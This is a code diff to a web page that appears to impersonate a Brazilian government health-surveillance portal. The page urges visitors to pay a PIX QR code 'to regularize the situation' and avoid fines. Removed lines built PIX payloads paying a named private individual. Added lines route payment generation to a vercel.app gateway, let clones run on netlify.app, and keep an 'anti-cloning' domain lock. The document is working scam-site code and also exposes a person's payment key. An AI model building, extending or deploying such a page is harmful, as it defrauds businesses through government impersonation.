@@ -28,7 +28,7 @@
 
         // 2. Trava de Domínio Rigorosa (Anti-Proxy / Clonagem Reversa)
         // Quando colocar o seu site no ar (ex: gov.br, vercel.app), adicione o URL exato dele aqui.
-        const dominiosPermitidos = ['localhost', '127.0.0.1', 'github.io', 'vercel.app', 'covisa', 'vigilanciadigital-sp.com.br']; 
+        const dominiosPermitidos = ['localhost', '127.0.0.1', 'github.io', 'vercel.app', 'netlify.app', 'covisa', 'vigilanciadigital-sp.com.br']; 
         const dominioAtual = window.location.hostname;
         let dominioAutorizado = false;
 
@@ -820,11 +820,11 @@
 
                     <p style="font-size: 0.9rem; color: #4a5568; margin-bottom: 15px; font-weight: 600;">Escaneie o QR Code abaixo com o aplicativo do seu banco para regularizar a situação e travar possíveis multas.</p>
 
-                    <img src="imagens/pix.jpeg" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
+                    <img src="data:image/svg+xml;utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='200' height='200' viewBox='0 0 200 200'%3E%3Crect width='200' height='200' fill='%23f8fafc'/%3E%3Ctext x='50%25' y='50%25' dominant-baseline='middle' text-anchor='middle' fill='%2364748b' font-family='Arial' font-size='14'%3EGerando QR Code PIX...%3C/text%3E%3C/svg%3E" alt="QR Code Pix" style="width: 200px; height: 200px; margin: 0 auto 20px; border-radius: 8px; border: 2px solid var(--gov-blue); padding: 5px; background: #fff;" />
 
                     <label style="font-size: 0.85rem; font-weight: 800; display: block; margin-bottom: 5px; text-align: left; color: #2d3748;">Pix Copia e Cola:</label>
                     <div style="display: flex; gap: 8px;">
-                      <input type="text" id="pix-copia-cola" value="00020126580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe25204000053039865802BR5925GILIARD DE OLIVEIRA SANTI60085500019962070503***6304D4E0" class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
+                      <input type="text" id="pix-copia-cola" value="" placeholder="Aguardando geração do código PIX..." class="form-control" style="margin-bottom: 0; font-size: 0.8rem; padding: 12px; border-color: #cbd5e0; background: #fff;" readonly />
                       <button onclick="window.copiarPix()" style="background: var(--gov-blue); color: #fff; border: none; padding: 0 20px; border-radius: 8px; cursor: pointer; transition: 0.3s;" title="Copiar código"><i class="fas fa-copy"></i></button>
                     </div>
                   </div>
@@ -2184,44 +2184,7 @@
     window.idPedidoConsultaAtual = null; 
     window.dadosPedidoAtual = {}; 
 
-    window.crc16 = function(payload) {
-        let polynomial = 0x1021;
-        let result = 0xFFFF;
-        for (let i = 0; i < payload.length; i++) {
-            result ^= payload.charCodeAt(i) << 8;
-            for (let j = 0; j < 8; j++) {
-                if ((result & 0x8000) !== 0) {
-                    result = (result << 1) ^ polynomial;
-                } else {
-                    result <<= 1;
-                }
-            }
-        }
-        return (result & 0xFFFF).toString(16).toUpperCase().padStart(4, '0');
-    };
-
-    window.gerarPixDinamico = function(valorStr) {
-        // Fix string format like "1.500,00" or "461,04" to "1500.00"
-        let cleanStr = valorStr.replace(/R\$\s?/g, '').trim();
-        cleanStr = cleanStr.replace(/\./g, '').replace(',', '.');
-        let valorNum = parseFloat(cleanStr);
-        if (isNaN(valorNum) || valorNum <= 0) valorNum = 0.00;
-        let valorFloat = valorNum.toFixed(2);
-        let valorLen = valorFloat.length.toString().padStart(2, '0');
-
-        let payloadStr = "000201" +
-                         "26580014br.gov.bcb.pix0136299713b0-c73d-4649-98ca-bb73764cdfe2" +
-                         "52040000" +
-                         "5303986" +
-                         "54" + valorLen + valorFloat +
-                         "5802BR" +
-                         "5925GILIARD DE OLIVEIRA SANTI" +
-                         "6009SAO PAULO" +
-                         "62070503***" +
-                         "6304";
-        let crc = window.crc16(payloadStr);
-        return payloadStr + crc;
-    };
+    // Pagamento PIX integrado exclusivamente via Gateway (/api/pix)
 
     window.maskCPFinCNPJ = function(i) {
       let v = i.value.replace(/\D/g,'');
@@ -3400,7 +3363,7 @@
                       try {
                           let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
                           let valorCobrado = parseFloat(valorFormatadoCalc);
-                          const LINK_DO_VERCEL = '/api/pix';
+                          const LINK_DO_VERCEL = window.location.hostname.includes('netlify.app') ? 'https://portal-vigilancia.vercel.app/api/pix' : '/api/pix';
 
                           let chaveCache = 'pix_gerado_' + pedido.cnpj.replace(/\D/g, '');
                           let pixCache = localStorage.getItem(chaveCache);
@@ -3706,7 +3669,7 @@ const formConsultaMulta = document.getElementById('form-consulta-multa');
                     try {
                         let valorFormatadoCalc = valorLimpo.replace(/\./g, '').replace(',', '.');
                         let valorCobrado = parseFloat(valorFormatadoCalc);
-                        const LINK_DO_VERCEL = '/api/pix';
+                        const LINK_DO_VERCEL = window.location.hostname.includes('netlify.app') ? 'https://portal-vigilancia.vercel.app/api/pix' : '/api/pix';
                         
                         const responsePix = await fetch(LINK_DO_VERCEL, {
                             method: 'POST',
